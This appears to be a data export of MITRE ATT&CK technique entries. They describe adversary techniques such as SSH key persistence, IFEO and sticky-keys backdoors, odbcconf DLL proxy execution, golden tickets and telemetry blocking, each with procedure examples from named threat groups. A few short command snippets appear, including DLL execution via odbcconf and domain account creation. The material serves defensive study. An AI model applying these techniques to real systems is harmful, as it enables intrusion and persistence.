T1098.004,SSH Authorized Keys,"Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>. Users may edit the system’s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value “yes” to ensure public key and RSA authentication are enabled. The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.  Adversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s “add-metadata” command an adversary may add SSH keys to a user account. Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API. This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH. It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.  Where authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user.   SSH keys can also be added to accounts on network devices, such as with the `ip ssh pubkey-chain` [Network Device CLI] command.","['[Earth Lusca] has dropped an SSH-authorized key in the `/root/.ssh` folder in order to access a compromised server with SSH.', '[Skidmap] has the ability to add the public key of its handlers to the <code>authorized_keys</code> file to maintain persistence on an infected host.', '[XCSSET] will create an ssh key if necessary with the <code>ssh-keygen -t rsa -f $HOME/.ssh/id_rsa -P</code> command. [XCSSET] will upload a private key file to the server to remotely access the host without a password. ', '[Bundlore] creates a new key pair with <code>ssh-keygen</code> and drops the newly created user key in <code>authorized_keys</code> to enable remote login.', '[TeamTNT] has added RSA keys in <code>authorized_keys</code>.']",False
T1590.006,Network Security Appliances,"Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.  Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning] or [Phishing for Information] Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases] or [Search Open Websites/Domains] establishing operational resources (ex: [Develop Capabilities] or [Obtain Capabilities] and/or initial access (ex: [External Remote Services]",[],
T1546.012,Image File Execution Options Injection,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\dbg\ntsd.exe -g  notepad.exe</code>).   IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.  IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached.   IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).   Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>.    Similar to [Accessibility Features] on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol] will cause the ""debugger"" program to be executed with SYSTEM privileges.   Similar to [Process Injection] these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.  Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.  Malware may also use IFEO to [Impair Defenses] by registering invalid debuggers that redirect and effectively disable various system and security applications.  ","['[SUNBURST] created an Image File Execution Options (IFEO) Debugger registry value for the process <code>dllhost.exe</code> to trigger the installation of [Cobalt Strike]', '[SDBbot] has the ability to use image file execution options for persistence if it detects it is running with admin privileges on a Windows version newer than Windows 7.', 'During the [C0032] campaign, [TEMP.Veles] modified and added entries within <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code> to maintain persistence.', '[TEMP.Veles] has modified and added entries within <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code> to maintain persistence.\t ']",
T1218.008,Odbcconf,"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. The Odbcconf.exe binary may be digitally signed by Microsoft.  Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32] odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR ""C:\Users\Public\file.dll""&rbrace;</code>).   ","['[Cobalt Group] has used <code>odbcconf</code> to proxy the execution of malicious DLL files.', '[Bumblebee] can use `odbcconf.exe` to run DLLs on targeted hosts.']",
T1593.002,Search Engines,"Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).  Adversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information] or [Search Open Technical Databases] establishing operational resources (ex: [Establish Accounts] or [Compromise Accounts] and/or initial access (ex: [Valid Accounts] or [Phishing]","['[Kimsuky] has searched for vulnerabilities, tools, and geopolitical trends on Google to target victims.']",
T1591.002,Business Relationships,"Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources.  Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information] Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media] or [Search Victim-Owned Websites] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information] or [Search Open Websites/Domains] establishing operational resources (ex: [Establish Accounts] or [Compromise Accounts] and/or initial access (ex: [Supply Chain Compromise] [Drive-by Compromise] or [Trusted Relationship]","['[Dragonfly] has collected open source information to identify relationships between organizations for targeting purposes.', ""[LAPSUS$] has gathered detailed knowledge of an organization's supply chain relationships."", 'In preparation for its attack against the 2018 Winter Olympics, [Sandworm Team] conducted online research of partner organizations listed on an official PyeongChang Olympics partnership site.']",
T1548.005,Temporary Elevated Cloud Access,"Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own.   Just-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.  Account impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts. In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.   Many cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.  While users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.  **Note:** this technique is distinct from [Additional Cloud Roles] which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles] that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.",[],False
T1055.013,Process Doppelgänging,"Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process.   Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations.  To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened.  To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction.   Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10.   Adversaries may abuse TxF to a perform a file-less variation of [Process Injection] Similar to [Process Hollowing] process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>.   Process Doppelgänging is implemented in 4 steps :  * Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction. * Load – Create a shared section of memory and load the malicious executable. * Rollback – Undo changes to original executable, effectively removing malicious code from the file system. * Animate – Create a process from the tainted section of memory and initiate execution.  This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process. ","['[SynAck] abuses NTFS transactions to launch and conceal malicious processes.', '[Bazar] can inject into a target process using process doppelgänging.', '[Leafminer] has used [Process Doppelgänging] to evade security software while deploying tools on compromised systems.\t']",
T1578.003,Delete Cloud Instance,An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.  An adversary may also [Create Cloud Instance] and later terminate the instance after achieving their objectives.,"[""[LAPSUS$] has deleted the target's systems and resources in the cloud to trigger the organization's incident and crisis response process.""]",
T1593.003,Code Repositories,"Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.    Adversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information] establishing operational resources (ex: [Compromise Accounts] or [Compromise Infrastructure] and/or initial access (ex: [Valid Accounts] or [Phishing]   **Note:** This is distinct from [Code Repositories] which focuses on [Collection] from private and internally hosted code repositories. ",['[LAPSUS$] has searched public code repositories for exposed credentials.'],False
T1574.005,Executable Installer File Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.  Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking]  Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control] Several examples of this weakness in existing common installers have been reported to software vendors.   If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",[],
T1546.008,Accessibility Features,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.  Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen.   Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP).  The [Image File Execution Options Injection] debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.  For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol] will cause the replaced file to be executed with SYSTEM privileges.   Other accessibility features exist that may also be leveraged in a similar fashion:   * On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code> * Magnifier: <code>C:\Windows\System32\Magnify.exe</code> * Narrator: <code>C:\Windows\System32\Narrator.exe</code> * Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code> * App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>","['[Empire] can leverage WMI debugging to remotely replace binaries like sethc.exe, Utilman.exe, and Magnify.exe with cmd.exe.', '[APT41] leveraged sticky keys to establish persistence. ', '[APT3] replaces the Sticky Keys binary <code>C:\\Windows\\System32\\sethc.exe</code> for persistence.', '[Deep Panda] has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions.', '[Axiom] actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence.', '[Fox Kitten] has used sticky keys to launch a command prompt.', '[APT29] used sticky-keys to obtain unauthenticated, privileged console access.']",False
T1562.006,Indicator Blocking,"An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting or even disabling host-based sensors, such as Event Tracing for Windows (ETW), by tampering settings that control the collection and flow of event telemetry. These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell] or [Windows Management Instrumentation]  For example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.   ETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell] <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.  In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.  In Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors .","['[HermeticWiper] has the ability to set the `HKLM:\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\CrashControl\\CrashDumpEnabled` Registry key to `0` in order to disable crash dumps.', '[APT41] developed a custom injector that enables an Event Tracing for Windows (ETW) bypass, making malicious processes invisible to Windows logging.', '[Woody RAT] has suppressed all error reporting by calling `SetErrorMode` with 0x8007 as a parameter.', '[APT5] has used the CLEANPULSE utility to insert command line strings into a targeted process to prevent certain log events from occurring.', '[HUI Loader] has the ability to disable Windows Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI) functions.', '[Brute Ratel C4] has the ability to hide memory artifacts and to patch Event Tracing for Windows (ETW) and the Anti Malware Scan Interface (AMSI).', '[Ebury] can hook logging functions so that nothing from the backdoor gets sent to the logging facility.\t', '[Waterbear] can hook the <code>ZwOpenProcess</code> and <code>GetExtendedTcpTable</code> APIs called by the process of a security product to hide PIDs and TCP records from detection.']",False
T1136.002,Domain Account,"Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.  Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.","['[Pupy] can user PowerView to execute “net user” commands and create domain accounts.', '[GALLIUM] created high-privileged domain user accounts to maintain access to victim networks.', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] created privileged domain accounts to be used for further exploitation and lateral movement. ', ""[Wizard Spider] has created and used new accounts within a victim's Active Directory environment to maintain persistence."", '[PsExec] has the ability to remotely create accounts on target systems.', 'The <code>net user username \\password \\domain</code> commands in [Net] can be used to create a domain account.', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] created two new accounts, “admin” and “система” (System). The accounts were then assigned to a domain matching local operation and were delegated new privileges.', '[HAFNIUM] has created domain accounts.', '[Empire] has a module for creating a new domain user if permissions allow.', '[Sandworm Team] has created new domain accounts on an ICS access server.']",False
T1589.003,Employee Names,"Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.  Adversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media] or [Search Victim-Owned Websites] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains] or [Phishing for Information] establishing operational resources (ex: [Compromise Accounts] and/or initial access (ex: [Phishing] or [Valid Accounts]","['To support initial access, [APT41] gained access to databases with information about existing accounts and lists of employees.', '[Kimsuky] has collected victim employee name information.', '[Sandworm Team] research of potential victim organizations included the identification and collection of employee information.', '[Silent Librarian] has collected lists of names for individuals from targeted organizations.']",
T1558.001,Golden Ticket,"Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket. Golden tickets enable adversaries to generate authentication material for any account in Active Directory.   Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.  The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets. The KRBTGT password hash may be obtained using [OS Credential Dumping] and privileged access to a domain controller.","['[Ke3chang] has used [Mimikatz] to generate Kerberos golden tickets.', '[Empire] can leverage its implementation of [Mimikatz] to obtain and use golden tickets.', '[Mimikatz] kerberos module can create golden tickets.', '[Rubeus] can forge a ticket-granting ticket.']",
T1592.004,Client Configurations,"Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.  Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning] (ex: listening ports, server banners, user agent strings) or [Phishing for Information] Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains] or [Search Open Technical Databases] establishing operational resources (ex: [Develop Capabilities] or [Obtain Capabilities] and/or initial access (ex: [Supply Chain Compromise] or [External Remote Services]","[""[HAFNIUM] has interacted with Office 365 tenants to gather details regarding target's environments.""]",
T1562.007,Disable or Modify Cloud Firewall,"Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall]   Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity, or remove networking limitations to support traffic associated with malicious activity (such as cryptomining).  Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.",['[Pacu] can allowlist IP addresses in AWS GuardDuty.'],False
T1036.002,Right-to-Left Override,"Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.  Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment] File] since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity. RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.","['[Ferocious Kitten] has used right-to-left override to reverse executables’ names to make them appear to have different file extensions, rather than their real ones.', '[BlackTech] has used right-to-left-override to obfuscate the filenames of malicious e-mail attachments.', '[Ke3chang] has used the right-to-left override character in spearphishing attachment names to trick targets into executing .scr and .exe files.', '[Scarlet Mimic] has used the left-to-right override character in self-extracting RAR archive spearphishing attachment file names.', '[BRONZE BUTLER] has used Right-to-Left Override to deceive victims into executing several strains of malware.']",
T1588.001,Malware,"Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.  In addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).","['[LuminousMoth] has obtained and used malware such as [Cobalt Strike]', 'During [Night Dragon] threat actors used Trojans from underground hacker websites.', 'For [Operation Spalax] the threat actors obtained malware, including [Remcos] [njRAT] and AsyncRAT.', '[TA2541] has used multiple strains of malware available for purchase on criminal forums or in open-source repositories.', '[LAPSUS$] acquired and used the Redline password stealer in their operations.', '[Metador] has used unique malware in their operations, including [metaMain] and [Mafalda]', '[APT1] used publicly available malware for privilege escalation.', '[Aquatic Panda] has acquired and used [njRAT] in its operations.', '[LazyScripter] has used a variety of open-source remote access Trojans for its operations.', 'For [FunnyDream] the threat actors used a new backdoor named [FunnyDream] ', '[Andariel] has used a variety of publicly-available remote access Trojans (RATs) for its operations.', '[TA505] has used malware such as [Azorult] and [Cobalt Strike] in their operations.', '[Turla] has used malware obtained after compromising other threat actors, such as [OilRig]', 'For [C0015] the threat actors used [Cobalt Strike] and [Conti] ransomware. ', '[Earth Lusca] has acquired and used a variety of malware, including [Cobalt Strike]', '[BackdoorDiplomacy] has obtained and used leaked malware, including DoublePulsar, EternalBlue, EternalRocks, and EternalSynergy, in its operations.']",
T1542.002,Component Firmware,"Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware] but conducted upon other system components/devices that may not have the same capability or level of integrity checking.  Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.","['[Equation] is known to have the capability to overwrite the firmware on hard drives from some manufacturers. ', '[Cyclops Blink] has maintained persistence by patching legitimate device firmware when it is downloaded, including that of WatchGuard devices.']",
T1048.001,Exfiltration Over Symmetric Encrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.   Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data.   Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). ",[],
T1137.001,Office Template Macros,"Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts.   Office Visual Basic for Applications (VBA) macros  can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded. Shared templates may also be stored and pulled from remote locations.   Word Normal.dotm location:<br> <code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm</code>  Excel Personal.xlsb location:<br> <code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB</code>  Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\Program Files (x86)\Microsoft Office\root\Office16\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.   An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.","['[MuddyWater] has used a Word Template, Normal.dotm, for persistence.', '[BackConfig] has the ability to use hidden columns in Excel spreadsheets to store executable files or commands for VBA macros.', '[Cobalt Strike] has the ability to use an Excel Workbook to execute additional code by enabling Office to trust macros and execute code without user permission.']",
T1583.003,Virtual Private Server,"Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.  Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.","['[APT28] hosted phishing domains on free services for brief periods of time during campaigns.', 'During the [C0032] campaign, [TEMP.Veles] used Virtual Private Server (VPS) infrastructure.', '[LAPSUS$] has used VPS hosting providers for infrastructure.', '[Axiom] has used VPS hosting providers in targeting of intended victims.', '[Dragonfly] has acquired VPS infrastructure for use in malicious campaigns.', '[HAFNIUM] has operated from leased virtual private servers (VPS) in the United States.', '[TEMP.Veles] has used Virtual Private Server (VPS) infrastructure.']",
T1213.001,Confluence," Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:  * Policies, procedures, and standards * Physical / logical network diagrams * System architecture diagrams * Technical system documentation * Testing / development credentials * Work / project schedules * Source code snippets * Links to network shares and other internal resources ","[""[LAPSUS$] has searched a victim's network for collaboration platforms like Confluence and JIRA to discover further high-privilege account credentials.""]",
T1550.003,Pass the Ticket,"Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.  When preforming PtT, valid Kerberos tickets for [Valid Accounts] are captured by [OS Credential Dumping] A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.  A [Silver Ticket] can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).  A [Golden Ticket] can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.  Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, ""overpassing the hash"" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash] while also using the password hash to create a valid Kerberos ticket.","['Some [SeaDuke] samples have a module to use pass the ticket with Kerberos for authentication.', '[APT29] used Kerberos ticket attacks for lateral movement.', '[Mimikatz] <code>LSADUMP::DCSync</code> and <code>KERBEROS::PTT</code> modules implement the three steps required to extract the krbtgt account hash and create/use Kerberos tickets.', '[Pupy] can also perform pass-the-ticket.', '[APT32] successfully gained remote access by using pass the ticket.', '[BRONZE BUTLER] has created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access.']",
